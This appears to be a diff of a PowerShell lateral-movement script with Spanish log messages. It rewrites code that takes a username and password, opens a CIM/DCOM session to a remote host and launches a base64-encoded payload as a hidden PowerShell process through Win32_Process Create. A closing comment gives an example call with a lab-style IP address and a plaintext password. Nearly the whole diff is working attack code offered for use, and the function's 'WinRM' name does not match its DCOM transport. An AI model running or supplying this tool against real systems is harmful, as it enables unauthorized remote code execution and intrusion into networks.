@@ -1,31 +1,40 @@
-param(
-    [string]$TargetIP,
-    [string]$Username,
-    [string]$Password,
-    [string]$PayloadBase64,
-    [int]$Port = 443
-)
+function Invoke-WinRM {
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$TargetIP,
 
-Write-Host "[*] Generando credenciales..."
-$secPassword = ConvertTo-SecureString $Password -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential ($Username, $secPassword)
+        [Parameter(Mandatory = $true)]
+        [string]$Username,
 
-Write-Host "[*] Estableciendo sesión CIM con $TargetIP ..."
-$opt = New-CimSessionOption -Protocol DCOM
-$session = New-CimSession -ComputerName $TargetIP -Credential $cred -SessionOption $opt
+        [Parameter(Mandatory = $true)]
+        [string]$Password,
 
-if ($session) {
-    Write-Host "[+] Sesión establecida con $TargetIP. Ejecutando payload..."
-    $cmd = "powershell -nop -w hidden -e $PayloadBase64"
-    $result = Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $cmd}
+        [Parameter(Mandatory = $true)]
+        [string]$PayloadBase64
+    )
 
-    if ($result.ReturnValue -eq 0) {
-        Write-Host "[+] Payload ejecutado exitosamente en $TargetIP (PID $($result.ProcessId))"
-    } else {
-        Write-Warning "[-] Error al ejecutar payload. Código de retorno: $($result.ReturnValue)"
+    Write-Host "[*] Generando credenciales..."
+    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
+    $Cred = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword)
+
+    Write-Host "[*] Estableciendo sesión CIM con $TargetIP ..."
+    $SessionOptions = New-CimSessionOption -Protocol DCOM
+    try {
+        $CimSession = New-CimSession -ComputerName $TargetIP -Credential $Cred -SessionOption $SessionOptions
+        Write-Host "[+] Sesión establecida con $TargetIP. Ejecutando payload..."
+    } catch {
+        Write-Host "[-] Error al establecer la sesión CIM: $_"
+        return
     }
 
-    Remove-CimSession -CimSession $session
-} else {
-    Write-Warning "[-] No se pudo establecer la sesión CIM con $TargetIP"
+    $Decoded = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($PayloadBase64))
+
+    Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell -nop -w hidden -c \"$Decoded\""} | Out-Null
+
+    Write-Host "[+] Payload ejecutado exitosamente en $TargetIP"
+    $CimSession | Remove-CimSession
 }
+
+# Ejemplo de uso:
+# $payload = '<BASE64_PAYLOAD>'
+# Invoke-WinRM -TargetIP "192.168.109.72" -Username "jen" -Password "Nexus123!" -PayloadBase64 $payload
